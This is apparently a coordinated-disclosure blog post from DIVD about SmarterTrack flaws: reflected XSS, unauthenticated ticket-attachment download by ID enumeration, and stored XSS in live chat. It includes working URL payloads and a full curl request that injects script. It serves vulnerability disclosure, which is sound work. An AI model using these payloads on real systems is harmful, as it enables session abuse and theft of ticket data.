---
layout: post
title: SmarterTrack Full disclosure
author: Finn van der Knaap
excerpt: "Full disclosure of vulnerabilities we discovered in SmarterTrack"
---
On 27 October 2021 [Wietse Boonstra](https://www.divd.nl/Wietse%20Boonstra) found several vulnerabilities in the latest version of SmarterTrack. There were [two](/CVE-2022-24384) [XSS](/CVE-2022-24386), an [unauthenticated download](/CVE-2022-24385) and an [upload / overwrite vulnerability](/CVE-2022-24387).

Today we are releasing case [DIVD-2021-00029](/DIVD-2021-00029) and are disclosing the details of the four CVEs.

CVE: CVE-2022-24384
Case: DIVD-2021-00029
Discoverd by: Wietse Boonstra
Credits: Discovered by Wietse Boonstra of DIVD
Products: SmarterTools - SmarterTrack V100.0.8019.14010
CVSS: X
Reference: https://csirt.divd.nl/cases/DIVD-2021-00029/, https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24384, https://csirt.divd.nl/cves/CVE-2022-24384/
Solution: Upgrade to latest version

Description: Cross-site Scripting (XSS) vulnerability in SmarterTools SmarterTrack 

POC: open the URL to the portal and simply add any type of script behind a URL with, for example, an error message. This is a working example script:
{SMARTERTRACK_URL}/Main/Default.aspx?viewSurveyError=Unknown+survey"><img%20src=x%20onerror=alert(1)>

Impact: When this attack is performed, the attacker can do any action that the user also can do. Fortunately, the attacker can't access any password from this attack since the credentials are protected. But the attacker can still see sensitive data and modify this.

*Input image 1*





CVE: CVE-2022-24385
Case: DIVD-2021-00029
Discoverd by: Wietse Boonstra
Credits: Discovered by Wietse Boonstra of DIVD
Products: SmarterTools - SmarterTrack V100.0.8019.14010
CVSS: X
Reference: https://csirt.divd.nl/cases/DIVD-2021-00029/, https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24384, https://csirt.divd.nl/cves/CVE-2022-24384/
Solution: Upgrade to latest version

Description: A Direct Object Access vulnerability in SmarterTools SmarterTrack leads to information disclosure

POC: Start a Private Browsing session to clear the sessions. Go to the following URL: {SMARTERTRACK_URL}/Management/Tickets/frmAttachment.aspx?ticketID=1
Now enumerate the ticketID and increment the 1. If the ticket has attachments, a zip file can be downloaded containing all the files.

Impact: When someone downloads the attachment without authorisation, sensitive data can be exposed that was added to the ticket.

*Input image 2*





CVE: CVE-2022-24386
Case: DIVD-2021-00029
Discoverd by: Wietse Boonstra
Credits: Discovered by Wietse Boonstra of DIVD
Products: SmarterTools - SmarterTrack V100.0.8019.14010
CVSS: 8.8
Reference: https://csirt.divd.nl/cases/DIVD-2021-00029/, https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24384, https://csirt.divd.nl/cves/CVE-2022-24384/
Solution: Upgrade to latest version

Description: Stored XSS in SmarterTools SmarterTrack. In smartertrack you can start a live chat to talk to a certain department. The problem with this is that you can change the value’s and execute an XSS when the operator opens the live chat.


PoC
Below the PoC curl request, starting a new chat containing the XSS;
The following POST parameters are vulnerable to the XSS:
CustomFields[0][DefaultValue]
CustomFields[1][DefaultValue]

Below is a Linux curl request where you need to change the “localhost” to the hostname of your SmarterTrack domain/IP.

curl -i -s -k -X $'POST' \
    -H $'Host: localhost:9996' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Content-Length: 565' -H $'Origin: http://localhost:9996' -H $'Connection: close' \
    --data-binary $'ChatID=-1&InfoGuid=3c2f7485c3264143bfee29bdc2c4f95b&LastEventID=-1&UserLanguage=&UnsentMessageStandard=test&DepartmentID=3&Status=2&CustomFields%5B0%5D%5BID%5D=1&CustomFields%5B0%5D%5BDefaultValue%5D=<IMG+\"\"\"><SCRIPT>alert(1)</SCRIPT>\">&CustomFields%5B0%5D%5BSpecialMapping%5D=UserDisplayName&CustomFields%5B0%5D%5BDisplayName%5D=Display+Name&CustomFields%5B1%5D%5BID%5D=2&CustomFields%5B1%5D%5BDefaultValue%5D=i@a.a<IMG+\"\"\"><SCRIPT>alert(2)</SCRIPT>\">&CustomFields%5B1%5D%5BSpecialMapping%5D=UserEmailAddress&CustomFields%5B1%5D%5BDisplayName%5D=Email&VisitorGuid=' \
    $'http://localhost:9996/api/Chat/StartChat'

When a chat operator opens the live chat, the XSS will execute.

Impact: This vulnerability is worse than the first XSS. This is because this is stored into the ticket itself. Everyone that opens the ticket will be affected by it, unlike the reflected XSS.

*Input image 3*
*Input image 4*
*Input image 5*
